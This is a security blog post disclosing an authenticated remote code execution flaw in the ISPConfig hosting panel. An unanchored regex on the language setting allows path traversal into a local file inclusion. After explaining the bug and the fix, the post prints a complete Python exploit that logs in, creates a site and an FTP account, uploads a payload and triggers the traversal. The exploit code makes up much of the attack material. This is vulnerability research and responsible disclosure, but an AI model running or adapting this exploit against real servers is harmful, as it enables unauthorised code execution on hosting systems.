<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.18.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Bug or Backdoor - Exploiting a Remote Code Execution in ISPConfig - 0x09AL Security blog</title>
<meta name="description" content="Introduction In this blogpost I will write about a suspicion I had which turned out to be false, how regex-es can go wrong and also how to chain logic features to achieve reliable Remote Command Execution.  ">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="0x09AL Security blog">
<meta property="og:title" content="Bug or Backdoor - Exploiting a Remote Code Execution in ISPConfig">
<meta property="og:url" content="https://0x09al.github.io/security/ispconfig/exploit/vulnerability/2018/08/20/bug-or-backdoor-ispconfig-rce.html">


  <meta property="og:description" content="Introduction In this blogpost I will write about a suspicion I had which turned out to be false, how regex-es can go wrong and also how to chain logic features to achieve reliable Remote Command Execution.  ">







  <meta property="article:published_time" content="2018-08-20T00:00:00+00:00">






<link rel="canonical" href="https://0x09al.github.io/security/ispconfig/exploit/vulnerability/2018/08/20/bug-or-backdoor-ispconfig-rce.html">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": null,
      "url": "https://0x09al.github.io/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="0x09AL Security blog Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0x09AL Security blog
          
        </a>
        <ul class="visible-links"></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name"></h3>
    
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Bug or Backdoor - Exploiting a Remote Code Execution in ISPConfig">
    <meta itemprop="description" content="IntroductionIn this blogpost I will write about a suspicion I had which turned out to be false, how regex-es can go wrong and also how to chain logic features to achieve reliable Remote Command Execution.">
    <meta itemprop="datePublished" content="2018-08-20T00:00:00+00:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Bug or Backdoor - Exploiting a Remote Code Execution in ISPConfig
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <h2 id="introduction">Introduction</h2>
<p>In this blogpost I will write about a suspicion I had which turned out to be false, how regex-es can go wrong and also how to chain logic features to achieve reliable Remote Command Execution.</p>

<p>I was having a coffe with one of my friends who works at a web-hosting company and talking about the software they use. There I heard about ISPConfig and how many features and secure it was.Since I had some free time , I decided to have a look at it and managed to find a critical vulnerability in it.</p>

<h2 id="finding-the-vulnerability">Finding the vulnerability</h2>

<p>I downloaded and installed ISPConfing on a Ubuntu VM and started analyzing the source code.
There were a lot of bad practices in the code, but there were also a lot of checks which made most of the code unexploitable.ISPConfig works as a system which contains clients,
and they can create websites, ftp accounts etc., but all of them are on their own chroot.</p>

<p>The first thing that I do when I audit some software is to find out what the attack surface is, and what kind of bugs I want to find.  Seeing this kind of architecture I decided to audit the code that was exposed from a client user. So I started auditing it , and after a lot of failed attempts because of the aggressive checks done by ISPConfig, I found something interesting in the <code class="language-plaintext highlighter-rouge">user_settings.php</code> file.</p>

<p>On almost any file there is a call to <code class="language-plaintext highlighter-rouge">include ISPC_ROOT_PATH.'/web/login/lib/lang/'.$_SESSION['s']['language'].'.lng';</code> Searching a little bit of where this value was initialized I found the source code below.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[a-z]{2}/'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'language'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'s'</span><span class="p">][</span><span class="s1">'user'</span><span class="p">][</span><span class="s1">'language'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'language'</span><span class="p">];</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'s'</span><span class="p">][</span><span class="s1">'language'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'language'</span><span class="p">];</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">'Invalid language.'</span><span class="p">);</span>
        <span class="p">}</span>

</code></pre></div></div>
<p>And I was like: “Come on , not regex checks again.”</p>

<p>But after reading the regex I noticied a flaw in the logic. The problem is that every string that contains two [a-z] characters will match the regex, and there were no further checks for path traversal attacks.</p>

<p>This was very strange since all of the regexes in the code had the <code class="language-plaintext highlighter-rouge">^ regex-pattern $</code> which only matched if the entire string matched the pattern not only a part of it.</p>

<p>Seeing this I was suspicious if this was a backdoor and not some random flaw, but after talking with Till (Maintainer of ISPConfig) he told me that it wasn’t the case and the code dated back as the first version of ISPConfig 3 and it was something that was missed during the internal audits.</p>

<h2 id="exploiting-the-vulnerability">Exploiting the vulnerability</h2>

<p>From the analysis now we have a directory traversal which can be abused for local file inclusion attacks.</p>

<p>Since in the new versions of php we can not use null byte injections, either a path-truncation attack but we can create a ftp-account, upload the file we want to include with <code class="language-plaintext highlighter-rouge">.lng</code> extension at our path and the code will get executed as the ispconfig account and not as our chroot-ed account.</p>

<p>So the idea of the exploit is like this :</p>

<ol>
  <li>Create a Site</li>
  <li>Create an FTP Account</li>
  <li>Disclose the current path of the FTP upload directory.</li>
  <li>Upload the payload to our directory.</li>
  <li>Include the uploaded payload.</li>
  <li>RCE Achieved !!!</li>
</ol>

<p>I wrote an exploit for this bug, which automatically did all the steps above by itself.
Below is an image of the exploit in action.</p>

<p><img src="/images/isp-config-exploit.png" alt="Exploiting the vulnerability" /></p>

<h2 id="closing-remarks">Closing remarks</h2>

<p>This was a nice bug to find and could have been missed very easily.
An important thanks goes to Till Brehm who acknoledged the vulnerability and fixed it in 1 day, which is impressive.</p>

<p>You can find more details on how to update <a href="https://www.ispconfig.org/blog/ispconfig-3-1-13-released-important-security-bugfix/">here</a>.</p>

<h1 id="exploit-code">Exploit code</h1>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">ftplib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>


<span class="n">host</span> <span class="o">=</span> <span class="s">"REPLACE_IP:8080"</span>
<span class="n">username</span> <span class="o">=</span> <span class="s">"REPLACE_Username"</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">"REPLACE_Password"</span>

<span class="n">exp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">user_agent</span> <span class="o">=</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'</span>
<span class="n">ftp_username</span> <span class="o">=</span> <span class="s">"randomusr1"</span>
<span class="n">domain</span> <span class="o">=</span> <span class="s">"pwnerrr.com"</span>
<span class="n">site_id</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">payload_name</span> <span class="o">=</span> <span class="s">"pwned1"</span>
<span class="n">path</span> <span class="o">=</span> <span class="s">""</span>



<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/login/index.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s">'s_mod'</span><span class="p">:</span><span class="s">'login'</span><span class="p">,</span><span class="s">'s_pg'</span><span class="p">:</span><span class="s">'index'</span><span class="p">},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">"wrong"</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">):</span>
		<span class="k">print</span> <span class="s">"[-] Incorrect credentials [-]"</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">"[+] Logged in Succesfully [+]"</span>


<span class="k">def</span> <span class="nf">createSite</span><span class="p">():</span>
	
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/sites/web_vhost_domain_edit.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">_csrf_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_key" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">_csrf_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_id" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">phpsessid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="phpsessid" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/sites/web_vhost_domain_edit.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'server_id'</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s">'ip_address'</span><span class="p">:</span><span class="s">'*'</span><span class="p">,</span><span class="s">'ipv6_address'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'domain'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">domain</span><span class="p">,</span><span class="s">'hd_quota'</span><span class="p">:</span><span class="mi">1024</span><span class="p">,</span><span class="s">'traffic_quota'</span><span class="p">:</span><span class="mi">1024</span><span class="p">,</span><span class="s">'subdomain'</span><span class="p">:</span><span class="s">'www'</span><span class="p">,</span><span class="s">'php'</span><span class="p">:</span><span class="s">'no'</span><span class="p">,</span><span class="s">'fastcgi_php_version'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'active'</span><span class="p">:</span><span class="s">'y'</span><span class="p">,</span><span class="s">'id'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'_csrf_id'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_id</span><span class="p">,</span><span class="s">'_csrf_key'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_key</span><span class="p">,</span><span class="s">'next_tab'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'phpsessid'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">phpsessid</span><span class="p">},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">pass</span>

<span class="k">def</span> <span class="nf">createFtp</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">site_id</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/sites/ftp_user_edit.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">"[+] Getting IDSof the sites [+]"</span>
	<span class="n">temp_array</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&lt;option value='</span><span class="p">)</span>
	<span class="n">nr_sites</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp_array</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">"[+] Number of sites </span><span class="si">%</span><span class="s">d [+]"</span> <span class="o">%</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">nr_sites</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
	<span class="c1"># Find the latest created site by checking the ID.
</span>	<span class="n">max_id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">9999</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">nr_sites</span><span class="p">):</span>
		<span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">temp_array</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span><span class="s">""</span><span class="p">))</span>
		<span class="k">if</span><span class="p">(</span><span class="n">temp</span> <span class="o">&gt;</span> <span class="n">max_id</span><span class="p">):</span>
			<span class="n">max_id</span> <span class="o">=</span> <span class="n">temp</span>
	<span class="n">site_id</span> <span class="o">=</span> <span class="n">max_id</span>
	<span class="k">print</span> <span class="s">"[+] Newly created site id is : </span><span class="si">%</span><span class="s">d [+]"</span> <span class="o">%</span> <span class="n">site_id</span>
	<span class="n">_csrf_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_key" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">_csrf_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_id" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">phpsessid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="phpsessid" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/sites/ftp_user_edit.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'parent_domain_id'</span><span class="p">:</span><span class="n">site_id</span><span class="p">,</span><span class="s">'username'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">ftp_username</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">password</span><span class="p">,</span><span class="s">'repeat_password'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">password</span><span class="p">,</span><span class="s">'quota_size'</span><span class="p">:</span><span class="mi">1024</span><span class="p">,</span><span class="s">'active'</span><span class="p">:</span><span class="s">'y'</span><span class="p">,</span><span class="s">'id'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'_csrf_id'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_id</span><span class="p">,</span><span class="s">'_csrf_key'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_key</span><span class="p">,</span><span class="s">'next_tab'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'phpsessid'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">phpsessid</span><span class="p">},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">"[+] Created FTP Account [+]"</span>
	<span class="k">pass</span>


<span class="k">def</span> <span class="nf">uploadPayload</span><span class="p">():</span>
	<span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
	<span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="o">+</span><span class="n">ftp_username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
	<span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s">"web"</span><span class="p">)</span>
	<span class="n">ftp</span><span class="o">.</span><span class="n">storlines</span><span class="p">(</span><span class="s">"STOR </span><span class="si">%</span><span class="s">s.lng"</span> <span class="o">%</span> <span class="n">payload_name</span><span class="p">,</span><span class="nb">open</span><span class="p">(</span><span class="s">"test.txt"</span><span class="p">))</span>
	<span class="k">print</span> <span class="s">"[+] Payload </span><span class="si">%</span><span class="s">s uploaded Succesfully [+]"</span> <span class="o">%</span> <span class="n">payload_name</span>
	<span class="k">pass</span>

<span class="k">def</span> <span class="nf">waitTillCreation</span><span class="p">():</span>
	<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">"[+] Trying [+]"</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/datalogstatus.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
		<span class="n">temp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
		<span class="k">if</span><span class="p">(</span><span class="n">temp</span><span class="p">[</span><span class="s">"count"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
			<span class="k">print</span> <span class="s">"[+] Everything created .... [+]"</span>
			<span class="k">return</span>
		<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getRelativePath</span><span class="p">():</span>
	
	<span class="k">global</span> <span class="n">path</span>

	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/sites/web_vhost_domain_edit.php?id=</span><span class="si">%</span><span class="s">d&amp;type=domain'</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">site_id</span><span class="p">),</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">path</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'Document Root&lt;/label&gt;'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&lt;div class="col-sm-9"&gt;'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'&lt;'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">path</span> <span class="o">+=</span> <span class="s">"/web/"</span> <span class="o">+</span> <span class="n">payload_name</span>
	<span class="k">print</span> <span class="s">"[+] Uploading payload in </span><span class="si">%</span><span class="s">s [+]"</span> <span class="o">%</span> <span class="n">path</span>

<span class="k">def</span> <span class="nf">triggerVuln</span><span class="p">():</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/tools/user_settings.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">_csrf_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_key" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">_csrf_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="_csrf_id" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">phpsessid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="phpsessid" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">user_id</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'name="id" value="'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/tools/user_settings.php'</span> <span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'passwort'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'repeat_password'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'language'</span><span class="p">:</span><span class="s">'../../../../../../../../../../../../../..</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">path</span><span class="p">,</span><span class="s">'id'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">user_id</span><span class="p">,</span><span class="s">'_csrf_id'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_id</span><span class="p">,</span><span class="s">'_csrf_key'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">_csrf_key</span><span class="p">,</span><span class="s">'next_tab'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span><span class="s">'phpsessid'</span><span class="p">:</span><span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">phpsessid</span><span class="p">},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">exp</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://</span><span class="si">%</span><span class="s">s/index.php'</span><span class="o">%</span> <span class="n">host</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>

<span class="n">login</span><span class="p">()</span>
<span class="n">createSite</span><span class="p">()</span>
<span class="n">createFtp</span><span class="p">()</span>
<span class="n">getRelativePath</span><span class="p">()</span>
<span class="n">waitTillCreation</span><span class="p">()</span>
<span class="n">uploadPayload</span><span class="p">()</span>
<span class="n">triggerVuln</span><span class="p">()</span>

</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-08-20T00:00:00+00:00">August 20, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html" class="pagination--pager" title="Bypassing Web-Application Firewalls by abusing SSL/TLS
">Previous</a>
    
    
      <a href="/security/applocker/bypass/custom/rules/windows/2018/09/13/applocker-custom-rules-bypass.html" class="pagination--pager" title="Bypassing AppLocker Custom Rules
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/ctf/web/challenge/xss/jquery/2020/03/29/volgactf-web-challenge.html" rel="permalink">VolgaCTF Qualifiers - UserCenter Web Challenge
</a>
      
    </h2>
    
    <p class="archive__item-excerpt" itemprop="description">During the weekend, I wanted to spend some time brushing up my web appsec skills and decided it would be a good idea to try some CTF challenges. One of the i...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/o365/redteam/phishing/oauth/toolkit/2019/05/31/introducing-o365-attack-toolkit.html" rel="permalink">Introducing Office 365 Attack Toolkit
</a>
      
    </h2>
    
